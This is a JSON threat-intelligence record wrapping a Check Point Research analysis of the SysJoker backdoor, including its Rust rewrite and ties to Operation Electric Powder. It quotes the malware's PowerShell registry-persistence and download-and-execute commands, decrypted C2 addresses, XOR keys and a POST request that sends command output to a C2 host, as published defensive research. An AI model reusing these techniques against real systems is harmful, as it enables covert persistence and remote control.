@@ -1,0 +1,208 @@
+{
+    "id": "5df244c0-042b-4dc4-aa3a-677773889b87",
+    "created_at": "2024-01-17T02:05:36.194388Z",
+    "updated_at": "2025-03-27T02:13:46.540628Z",
+    "deleted_at": null,
+    "sha1_hash": "fa03024e3a1093b0ed371ab0694131ede49c5f32",
+    "title": "",
+    "authors": "",
+    "file_creation_date": "2024-01-16T04:27:13Z",
+    "file_modification_date": "2024-01-16T04:27:13Z",
+    "file_size": 3254868,
+    "plain_text": "# Israel-Hamas War Spotlight: Shaking the Rust Off SysJoker\n\n**research.checkpoint.com/2023/israel-hamas-war-spotlight-shaking-the-rust-off-sysjoker**\n\n## Key Findings\n\n\nNovember 23, 2023\n\n\nCheck Point Research is actively tracking the evolution of SysJoker, a previously publicly unattributed multi-platform backdoor, which we\nasses was utilized by a Hamas-affiliated APT to target Israel.\nAmong the most prominent changes is the shift to Rust language, which indicates the malware code was entirely rewritten, while still\nmaintaining similar functionalities. In addition, the threat actor moved to using OneDrive instead of Google Drive to store dynamic C2\n(command and control server) URLs.\nAnalysis of newly discovered variants of SysJoker revealed ties to previously undisclosed samples of Operation Electric Powder, a set of\ntargeted attacks against Israeli organizations between 2016-2017 that were loosely linked to the threat actor known as Gaza Cybergang.\n\n## Introduction\n\nAmid tensions in the ongoing Israel-Hamas war, Check Point Research has been conducting active threat hunting in an effort to discover,\nattribute, and mitigate relevant regional threats. Among those, some new variants of the SysJoker malware, including one coded in Rust, recently\ncaught our attention. Our assessment is that these were used in targeted attacks by a Hamas-related threat actor.\n\n[SysJoker, initially discovered by Intezer in 2021, is a multi-platform backdoor with multiple variants for Windows, Linux and Mac. The same](https://intezer.com/blog/research/new-backdoor-sysjoker/)\n[malware was also analyzed in another report a few months after the original publication. Since then, SysJoker Windows variants have evolved](https://blogs.vmware.com/security/2022/03/%e2%80%afsysjoker-an-analysis-of-a-multi-os-rat.html)\nenough to stay under the radar.\n\nAs we investigated the newer variants of SysJoker that were utilized in targeted attacks in 2023, we also discovered a variant written in Rust,\nwhich suggests the malware code was completely rewritten. In addition, we also uncovered behavioral similarities with another campaign\n[named Operation Electric Powder which targeted Israel in 2016-2017. This campaign was previously linked to Gaza Cybergang (aka Molerats), a](https://www.clearskysec.com/iec/)\nthreat actor operating in conjunction with Palestinian interests.\n\nIn this article, we drill down into the Rust version of SysJoker, as well as disclose additional information on other SysJoker Windows variants and\ntheir attribution.\n\n## Rust SysJoker Variant\n\nThe SysJoker variant (9416d7dc2ecdeda92ba35cd5e54eb044), written in Rust, was submitted to VirusTotal with the name php-cgi.exe on\nOctober 12, 2023. Compiled a few months earlier on August 7, it contains the following PDB path: C:\\Code\\Rust\\RustDown```\nBelal\\target\\release\\deps\\RustDown.pdb.\n\n```\nThe malware employs random sleep intervals at various stages of its execution, which may serve as possible anti-sandbox or anti-analysis\nmeasures.\n\nThe sample has two modes of operation which are determined by its presence in a particular path. This is intended to differentiate the first\nexecution from any subsequent ones based on persistence.\n\nFirst, it checks whether the current running module matches the path C:\\ProgramData\\php-7.4.19-Win32-vc15-x64\\php-cgi.exe. Based on\nthe outcome the malware proceeds to one of the two possible stages.\n\n\n-----\n\n### First execution\n\nIf the sample runs from a different location, indicating it’s the first time the sample is executed, the malware copies itself to the\npath C:\\ProgramData\\php-7.4.19-Win32-vc15-x64\\php-cgi.exe and then runs itself from the newly created path using PowerShell with the\nfollowing parameter:\n\n-Command C:\\ProgramData\\php-7.4.19-Win32-vc15-x64\\php-cgi.exe\n\nFinally, it creates a persistence mechanism and then exits the program.\n\nPersistence is established in an unusual way, using PowerShell with the following argument:\n\n-Command \"$reg=[WMIClass]'ROOT\\DEFAULT:StdRegProv';\n\n$results=$reg.SetStringValue('&amp;H80000001','Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'php-cgi', 'C:\\ProgramData\\php-7.4.19Win32-vc15-x64\\php-cgi.exe');\"\n\nEventually, this PowerShell code creates a registry Run key in the HKEY_CURRENT_USER hive, which points to the copy of the executable, using the\n[WMI StdRegPro class instead of directly accessing the registry via the Windows API or reg.exe.](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/regprov/stdregprov)\n\n### Subsequent executions (from persistence)\n\nSysJoker contacts a URL on OneDrive to retrieve the C2 server address. The URL is hardcoded and encrypted inside the binary:\n\nhttps://onedrive.live[.]com/download?resid=16E2AEE4B7A8BBB1%21112&amp;authkey=!AED7TeCJaC7JNVQ\n\nThe response should contain also a XOR-encrypted blob of data that is encoded in base64. During our investigation, the following response was\nreceived:\n\nKnM5Sjpob2glNTY8AmcaYXt8cAh/fHZ+ZnUNcwdld2Mr\n\nAfter decryption, the C2 IP address and port are revealed:\n\n{\"url\":\"http://85.31.231[.]49:443\"}\n\nUsing OneDrive allows the attackers to easily change the C2 address, which enables them to stay ahead of different reputation-based services.\nThis behavior remains consistent across different versions of SysJoker.\n\nThe malware collects information about the infected system, including the Windows version, username, MAC address, and various other data.\nThis information is then sent to the /api/attach API endpoint on the C2 server, and in response it receives a unique token that serves as an\nidentifier when the malware communicates with the C2:\n\nFigure 1 – Bot registration api call.\n\nAfter registration with the C2 server, the sample runs the main C2 loop. It sends a POST request containing the unique token to\nthe /api/req endpoint, and the C2 responds with JSON data:\n\nFigure 2 – Command request and response.\n\nThe expected response from the server is a JSON that contains a field named data that contains an array of actions for the sample to execute.\nEach array consists of id and request fields. The request field is another JSON with fields called url and name. An example of the response\nfrom the server:\n\n{\"data\":[{\"id\":\"1\", \"request\":\"{\"url\": \"http://85.31.231[.]49/archive_path\", \"name\":\"mal_1.exe\"}\"}, {\"id\":\"2\", \"request\":\"{\"url\":\n\"http://85.31.231[.]49/archive_path\", \"name\":\"mal_2.exe\"}\"}]}\n\n\n-----\n\nThe malware downloads a zip archive from the URL specified in the url field. The archive contains an executable that after unzipping is saved as\nthe name field into C:\\ProgramData\\php-Win32-libs folder. The archive is unzipped using the following PowerShell command:\n\npowershell -Command Expand-Archive -Path C:\\ProgramData\\php-Win32-libs\\XMfmF.zip -DestinationPath C:\\ProgramData\\php-Win32-libs ; start\nC:\\ProgramData\\php-Win32-libs\\exe_name.exe\n\nIt is important to mention that in previous SysJoker operations, the malware also had the ability not only to download and execute remote files\nfrom an archive but also to execute commands dictated by the operators. This functionality is missing in the Rust version. After receiving and\nexecuting the file download command, depending on whether the operation was successful or not, the malware contacts the C2 server again and\nsend a success or exception message to the path /api/req/res. The server sends back a JSON confirmation indicating that it has received the\ninformation: {\"status\":\"success\"}.\n\n### Encryption\n\nThe malware has two methods for string decryption. The first method is simple and appears across multiple SysJoker variants. The sample\ncontains several base64-encoded encrypted data blobs and a base64-encoded key. Upon decryption, both blobs are base64-decoded and then\nXORed to produce the plain text strings.\n\nThe second encryption method is tedious and is spliced in-line throughout the program repeatedly at compile time. This generates a complex\nstring decryption algorithm throughout the sample.\n\nFigure 3 – Example of the decryption of the string “php-”.\n\n## Windows SysJoker Variants\n\nIn addition to the newly found Rust variant, we uncovered two more SysJoker samples that were not publicly exposed in the past. Both of these\nsamples are slightly more complex than the Rust version or any of the previously analyzed samples, possibly due to the public discovery and\nanalysis of the malware. One of these samples, in contrast to other versions, has a multi-stage execution flow, consisting of a downloader, an\ninstaller, and a separate payload DLL.\n\n## DMADevice variant\n\nThe DMADevice sample (d51e617fe1c1962801ad5332163717bb) was compiled in May 2022, a few months after SysJoker was first uncovered.\n\nLike other versions, the malware starts by retrieving the C2 server address by contacting the URL:\n\nhttps://onedrive.live[.]com/download?cid=F6A7DCE38A4B8570&amp;resid=F6A7DCE38A4B8570!115&amp;authkey=AKcf8zLcDneJZHw\n\nThe OneDrive link responds with an encrypted base64-encoded string, which is decrypted with the XOR\nkey QQL8VJUJMABL8H5YNRC9QNEOHA4I3QDAVWP5RY9L0HCGWZ4T7GTYQTCQTHTTN8RV6BMKT3AICZHOFQS8MTT. This is the same key that is used in the\nRust version.\n\nThe decrypted blob contains a JSON with the C2 domain in the following format:\n\n{\"url\":\"http://sharing-u-file[.]com\"}\n\nNext, the malware proceeds to the three-stage execution process.\n\n1. Setup files and persistence\n\nThe sample generates a unique bot ID, sends it in a POST request to the /api/cc API endpoint, and receives back the JSON describing the\ndesired malware setup on the infected machine.\n\nThe JSON has the following structure:\n\n{\"key\":\"f57d611b-0779-4125-a3e84f8ca3116509\",\"pi\":\"VwUD[REDACTED]\",\"data\":\"PRdkHUVFVA9pQl5BXA8YE2JHQgZBBFVpVRJZQU0RdXx3cVVPD1ZSRhoTdS9sY1hbTFldXlx8QwIRSRp\n\nThe field key in the JSON is used to XOR-decrypt the other fields after they are base64-decoded: the pi field contains the victim’s IP address and\nthe data field contains the array with multiple values:\n\n[\"SystemDrive\",\"ProgramData\",\"DMADevice\",\"DMASolutionInc\",\"DMASolutionInc.exe\",\"DMASolutionInc.dll\",\"powershell.exe\",\"cmd\",\"open\",\"start\",\"\\/c\nREG ADD HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run \\/V\",\"\\/t REG_SZ \\/D\",\".exe\",\"$env:username | Out-File -Encoding 'utf8'\n'\",\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"]\n\nThose values are utilized in the following order:\n```\n   SystemDrive – Get the system hard drive letter.\n   ProgramData – Create these two folders under the specified (in this case, ProgramData) folder:\n\n```\n– DMADevice – The first folder name created.\n– DMASolutionInc.exe – The file name used by the currently running executable to self-replicate into the DMADevice folder.\n```\n   DMASolutionInc.dll – The name of the config file\n\n```\n\n-----\n\n```\n   DMASolutionInc – The second folder name created.\n\n```\nThe rest of the values are used in a few commands that establish persistence via the registry Run key and retrieve the current user name\nfrom $env into the temporary txt file.\n\nThe config file, in our case DMASolutionInc.dll, is stored on a disk encrypted (using the same key used to decrypt the domain) and base64encoded. It contains encrypted JSON with the following fields:\n\n{\"id\":\"[BOT-ID]\",\"us\":\"[USERNAME]\",\"ip\":\"[IP]\"}\n\nAfter performing all these operations, the sample executes its copy from DMASolutionInc.exe and exits.\n\n2. Register with the C2 server\n\nWhen the sample is executed again (via persistence from the previous stage), it checks the location it is running from. It then continues the\nexecution by making a POST request to /api/add containing the uuid, user name, and user token, which is also generated by the malware:\n\nuuid=bot-id&nu=username&user_token=token\n\nThe server responds with a token generated on its side which is then used for all the subsequent C2 requests.\n\n3. C2 main loop\n\nThe token received during the previous stage is used for making POST requests to /api/cr on the C2 server to retrieve the commands to\nexecute.\n\nSimilar to other SysJoker variants, the server responds with a JSON that contains field data which is an array of actions to take. This version can\ndownload and execute files or run commands and upload the results to the C2 server. For each command in the array, the sample sends a\nresponse reporting if it was successful or not.\n\n## AppMessagingRegistrar variant\n\nThis variant has a compilation timestamp of June 2022 and has a quite different execution flow. The functionality of the malware is divided into\ntwo separate components: a downloader (DDN, c2848b4e34b45e095bd8e764ca1a4fdd) and a backdoor\n(AppMessagingRegistrar, 31c2813c1fb1e42b85014b2fc3fe0666).\n\n**DDN Downloader**\n\nThe threat actors first deliver a lightweight downloader. It creates the folder C:\\ProgramData\\NuGet Library\\, then downloads a zip file\nfrom https://filestorage-short[.]org/drive/AppMessagingRegistrar.zip . It unzips the file, copies it into\nthe AppMessagingRegistrar.exe file and then executes it.\n\nSplitting the functionality into separate components has proved effective: at the time of the first submission to VirusTotal (VT), the malware was\nnot detected by any of the platform’s engines:\n\nFigure 4 – DNN downloader with 0 detections on its first submission to VT (2023-04-09).\n\n**AppMessagingRegistratar**\n\nUpon execution, this payload first checks the registry key SOFTWARE\\Intel\\UNP\\ProgramUpdates\\UUID for the UUID of the PC. If the registry key\nis not available, a UUID is generated using the UuidCreate function and is then saved to the previously mentioned key.\n\nFigure 5 – Uuid Generation.\n\nThe variant then proceeds to decrypt a hardcoded OneDrive URL to retrieve a C2 address. The XOR key in this sample\nis 22GC18YH0N4RUE0BSJOAVW24624ULHIQGS4Y1BQQUZYTENJN2GBERQBFKF2W78H7.\n\nAfter the C2 address is decrypted, a POST request is made to the C2 server API endpoint /api/register which contains the previously\ngenerated UUID.\n\nThe server responds with a JSON containing a token and a status message:\n\n{\"status\": \"success\", \"token\":\"[TOKEN]\", \"status_num\":1}\n\nThe status indicates if the request was valid or not, and the samples check specifically for the string “success”. The token is used for all the\nfollowing C2 requests but unlike all the other samples, instead of using the body of requests, it is sent in the Authorization\nheader: Authorization: Bearer [TOKEN]. This change could be to accommodate additional flows in the malware execution (discussed below) in\nwhich the malware sends a GET request instead of a POST and requires a mechanism for the server to identify the sender.\n\nThe status_num field is used as a global flag to indicate what actions the bot should take. There are four statuses available:\n\n\n-----\n\n**Status Number** **Action** **Description**\n\n0 Setup Download MsoftInit.dll and execute the init and step exports.\n\n1 Idle loop Wait for status_num to change.\n\n3 Payload retrieval Download and save MsoftNotify.dll DLL.\n\n4 Payload execution Execute MsoftNotify.dll DLL.\n\n**Setup phase**\nIf the received status_num is 0, the malware creates\nthe C:\\ProgramData\\Intel\\UNP\\ProgramUpdates and C:\\ProgramData\\Intel\\Drivers\\MsoftUpdates folders. It then proceeds to:\n\n1. Download a DLL file using the function UrlDownloadToFileW from the path /api/library/[TOKEN] and save it\n\nto C:\\ProgramData\\Intel\\Drivers\\MsoftUpdates\\MsoftInit.dll.\n2. Load the MsoftInit.dll and call the init exported function.\n3. Load the same DLL again and call the step exported function.\n\nThe exact purpose of those functions is unknown as we were not able to retrieve the DLL. However, due to the names and our analysis of\nprevious versions of the malware, we believe they were part of the persistence and setup process. Finally, the malware sends an empty POST\nrequest to the API endpoint /api/update. The expected response from the server is an empty JSON.\n\n**Idle loop**\nIf the status_num is 1, the malware continues to make requests to the C2 API endpoint /api/status in an infinite loop. To break the loop,\nthe status_num must change.\n\n**Main payload download**\nIf the status_num is 3, the malware proceeds to download a DLL file from URL /api/library/[TOKEN] and saves it to the\npath C:\\ProgramData\\Intel\\Drivers\\MsoftUpdates\\MsoftNotify.dll. It then sends a request to the C2 API endpoint /api/ready: if the\nserver responds with a status success, the status flag is then set to 4.\n\n**Payload execution**\nIf the status is 4, the malware proceeds to make a GET request to the C2 API endpoint /api/requests. The C2 server responds with a JSON\nwith 3 parameters, id, r, and k.\n\nThe malware then loads the MsoftNotify.dll DLL and resolves the function st. The r and k values sent from the server are used by st as\nparameters. We were not able to retrieve the DLL, but based on the previous versions, this is likely a version of the main command running\nfunctionality for the backdoor, and its return value should be a string. After the function runs and returns a result, the id received in the token is\nused in the POST request to the C2 which contains the output:\n\nPOST /api/requests/[ID] HTTP/1.1\n\nHost: [62.108.40.129](https://www.virustotal.com/gui/url/79fde5d4b19cbd1f920535215c558b6ff63973b7af7d6bd488e256821711e0b1)\n\nAccept: application/json\n\nAuthorization: Bearer [TOKEN]\n\nContent-Length: 15\n\nContent-Type: application/x-www-form-urlencoded\n\nresponse=[EXECUTION OUTPUT]\n\n## Infrastructure\n\nThe infrastructure used in this campaign is configured dynamically. First, the malware contacts a OneDrive address, and from there, it decrypts\nthe JSON containing the C2 address with which to communicate. The C2 address is encrypted with a hardcoded XOR key and base64-encoded.\n\nThis threat actor commonly uses cloud storage services. Previous reports show Google Drive was used for the same purpose.\n\nFigure 6 – Metadata of OneDrive file containing the encrypted C2 server.\n\n## Ties to Operation Electric Powder\n\nThe SysJoker backdoor uses its own custom encryption for three main strings: the OneDrive URL containing the final C2 address, the C2 address\nreceived from the request to OneDrive, and a PowerShell command used for persistence:\n\n$reg=[WMIClass]'ROOT\\DEFAULT:StdRegProv';\n\n$results=$reg SetStringValue('&H80000001' 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'[TRUNCATED]\n\n\n-----\n\nThis PowerShell command based on the StdRegProv WMI class is quite unique. It is shared between multiple variants of SysJoker and only\nappears to be shared with one other campaign, associated with Operation Electric Powder previously reported by ClearSky.\n\n[The 2017 report describes the persistent activity carried out in 2016-2017 against the Israel Electric Company (IEC). This operation used phishing](https://www.clearskysec.com/iec/)\nand fake Facebook pages to deliver both Windows and Android malware. Windows malware used in this campaign consisted of a dropper, a main\nbackdoor, and a Python-based keylogging and screen-grabbing module.\n\nThroughout our analysis of the SysJoker operation, we saw indications suggesting that the same actor is responsible for both attacks, despite\nthe large time gap between the operations. Both campaigns used API-themed URLs and implemented script commands in a similar fashion. This\nincludes the Run registry value but is not the only common factor. For example, the following image shows the similarities between the commands\nused by different malware when gathering recon data from the infected device to temporary text files:\n\nFigure 7 – Use of the type command in Electric Powder → the original SysJoker → DMADevice SysJoker variant.\n\n## Conclusion\n\nAlthough the SysJoker malware, which was first seen in 2021 and publicly described in 2022, wasn’t attributed to any known actor, we found\nevidence that this tool and its newer variants have been used as part of the Israeli-Hamas conflict. We were also able to make a connection\nbetween SysJoker and the 2016-2017 Electric Powder Operation against Israel Electric Company.\n\nIn our report, we described the evolution of the malware and the changes in the complexity of its execution flow, as well as its latest shift to the\nRust language and the latest infrastructure it uses.\n\nThe earlier versions of the malware were coded in C++. Since there is no straightforward method to port that code to Rust, it suggests that the\nmalware underwent a complete rewrite and may potentially serve as a foundation for future changes and improvements.\n\n## Check Point Customers Remain Protected\n\n[Check Point Customers remain protected against attacks detailed in this report, while using Check Point Anti-Bot, Harmony Endpoint and Threat](https://www.checkpoint.com/harmony/advanced-endpoint-protection/)\n[Emulation.](https://www.checkpoint.com/infinity/zero-day-protection/)\n\n**Threat Emulation**\nBackdoor.Wins.Sysjoker.ta.R\nBackdoor.Wins.Sysjoker.ta.Q\nBackdoor.Wins.Sysjoker.ta.P\nBackdoor.Wins.Sysjoker.ta.O\nBackdoor.Wins.Sysjoker.ta.N\nBackdoor.Wins.Sysjoker.ta.M\nBackdoor.Wins.Sysjoker.ta.L\n\n**Harmony Endpoint**\nBackdoor.Win.SysJoker.H\n\nBackdoor_Linux_SysJoker_A/B/C/D/E/F\n\n**Check Point Anti-Bot**\nBackdoor.WIN32.SysJoker.A\nBackdoor.WIN32.SysJoker.B\nBackdoor.WIN32.SysJoker.C\n\n## IOCs\n\n### Infrastructure\n\n85.31.231[.]49\n\nsharing-u-file[.]com\n\nfilestorage-short[.]org\n\naudiosound-visual[.]com\n\n62.108.40[.]129\n\n\n-----\n\n### Hashes\n\nd4095f8b2fd0e6deb605baa1530c32336298afd026afc0f41030fa43371e3e72\n\n\n-----\n\n6c8471e8c37e0a3d608184147f89d81d62f9442541a04d15d9ead0b3e0862d95\n\ne076e9893adb0c6d0c70cd7019a266d5fd02b429c01cfe51329b2318e9239836\n\n96dc31cf0f9e7e59b4e00627f9c7f7a8cac3b8f4338b27d713b0aaf6abacfe6f\n\n67ddd2af9a8ca3f92bda17bd990e0f3c4ab1d9bea47333fe31205eede8ecc706\n\n0ff6ff167c71b86c511c36cba8f75d1d5209710907a807667f97ce323df9c4ba\n\nGO UP\n[BACK TO ALL POSTS](https://research.checkpoint.com/latest-publications/)\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
+            "created_at": "2022-10-25T16:06:24.199525Z",
+            "updated_at": "2022-10-25T16:06:24.199525Z",
+            "deleted_at": null,
+            "name": "CyberMonitor",
+            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
+            "description": "APT & Cybercriminals Campaign Collection",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2023/2023.11.23.israel-hamas-sysjoker/Israel-Hamas%20War%20Spotlight_%20Shaking%20the%20Rust%20Off%20SysJoker%20-%20Check%20Point%20Research.pdf"
+    ],
+    "report_names": [
+        "Israel-Hamas War Spotlight_ Shaking the Rust Off SysJoker - Check Point Research"
+    ],
+    "threat_actors": [
+        {
+            "id": "cd402658-d63c-40bc-b6ce-bb3d742904c5",
+            "created_at": "2023-12-01T02:02:33.960041Z",
+            "updated_at": "2025-03-27T02:02:10.045693Z",
+            "deleted_at": null,
+            "main_name": "Operation Electric Powder",
+            "aliases": [],
+            "source_name": "ETDA:Operation Electric Powder",
+            "tools": [
+                "SysJoker"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "1162e0d4-b69c-423d-a4da-f3080d1d2b0c",
+            "created_at": "2023-01-06T13:46:38.508262Z",
+            "updated_at": "2025-03-27T02:00:02.851407Z",
+            "deleted_at": null,
+            "main_name": "Molerats",
+            "aliases": [
+                "Gaza Hackers Team",
+                "Gaza cybergang",
+                "Gaza Cybergang",
+                "Operation Molerats",
+                "Extreme Jackal",
+                "ALUMINUM SARATOGA",
+                "G0021",
+                "BLACKSTEM"
+            ],
+            "source_name": "MISPGALAXY:Molerats",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "0c502f6d-640d-4e69-bfb8-328ba6540d4f",
+            "created_at": "2022-10-25T15:50:23.756782Z",
+            "updated_at": "2025-03-27T02:00:55.539397Z",
+            "deleted_at": null,
+            "main_name": "Molerats",
+            "aliases": [
+                "Molerats",
+                "Operation Molerats",
+                "Gaza Cybergang"
+            ],
+            "source_name": "MITRE:Molerats",
+            "tools": [
+                "MoleNet",
+                "DustySky",
+                "DropBook",
+                "SharpStage",
+                "PoisonIvy"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "847f600c-cf90-44c0-8b39-fb0d5adfcef4",
+            "created_at": "2022-10-25T16:07:23.875541Z",
+            "updated_at": "2025-03-27T02:02:10.005591Z",
+            "deleted_at": null,
+            "main_name": "Molerats",
+            "aliases": [
+                "ATK 89",
+                "Aluminum Saratoga",
+                "Extreme Jackal",
+                "Gaza Cybergang",
+                "Gaza Hackers Team",
+                "Molerats",
+                "Operation DustySky",
+                "Operation DustySky Part 2",
+                "Operation Molerats",
+                "Operation Moonlight",
+                "Operation SneakyPastes",
+                "Operation TopHat",
+                "TA402",
+                "TAG-CT5"
+            ],
+            "source_name": "ETDA:Molerats",
+            "tools": [
+                "BadPatch",
+                "Bladabindi",
+                "BrittleBush",
+                "Chymine",
+                "CinaRAT",
+                "Darkmoon",
+                "Downeks",
+                "DropBook",
+                "DustySky",
+                "ExtRat",
+                "Gen:Trojan.Heur.PT",
+                "H-Worm",
+                "H-Worm RAT",
+                "Houdini",
+                "Houdini RAT",
+                "Hworm",
+                "Iniduoh",
+                "IronWind",
+                "Jenxcus",
+                "JhoneRAT",
+                "Jorik",
+                "KasperAgent",
+                "Kognito",
+                "LastConn",
+                "Micropsia",
+                "MoleNet",
+                "Molerat Loader",
+                "NeD Worm",
+                "NimbleMamba",
+                "Njw0rm",
+                "Pierogi",
+                "Poison Ivy",
+                "Quasar RAT",
+                "QuasarRAT",
+                "SPIVY",
+                "Scote",
+                "SharpSploit",
+                "SharpStage",
+                "WSHRAT",
+                "WelcomeChat",
+                "Xtreme RAT",
+                "XtremeRAT",
+                "Yggdrasil",
+                "dinihou",
+                "dunihi",
+                "njRAT",
+                "pivy",
+                "poisonivy"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "efe6ff9a-822d-41a6-90c3-45265cac696b",
+            "created_at": "2024-05-01T02:03:07.920302Z",
+            "updated_at": "2025-03-27T02:05:17.246342Z",
+            "deleted_at": null,
+            "main_name": "ALUMINUM SARATOGA",
+            "aliases": [
+                "Arid Viper",
+                "Desert Falcon",
+                "Extreme Jackal ",
+                "Gaza CyberGang",
+                "Gaza CyberGang",
+                "Molerats ",
+                "Operation DustySky ",
+                "TA402",
+                "APT-C-23"
+            ],
+            "source_name": "Secureworks:ALUMINUM SARATOGA",
+            "tools": [
+                " BrittleBush",
+                " DarkComet",
+                " LastConn",
+                " Micropsia",
+                " NimbleMamba",
+                " PoisonIvy",
+                " QuasarRAT",
+                " XtremeRat",
+                "BlackShades"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1705457136,
+    "ts_updated_at": 1743041626,
+    "ts_creation_date": 1705379233,
+    "ts_modification_date": 1705379233,
+    "files": {
+        "pdf": "https://archive.orkl.eu/fa03024e3a1093b0ed371ab0694131ede49c5f32.pdf",
+        "text": "https://archive.orkl.eu/fa03024e3a1093b0ed371ab0694131ede49c5f32.txt",
+        "img": "https://archive.orkl.eu/fa03024e3a1093b0ed371ab0694131ede49c5f32.jpg"
+    }
+}
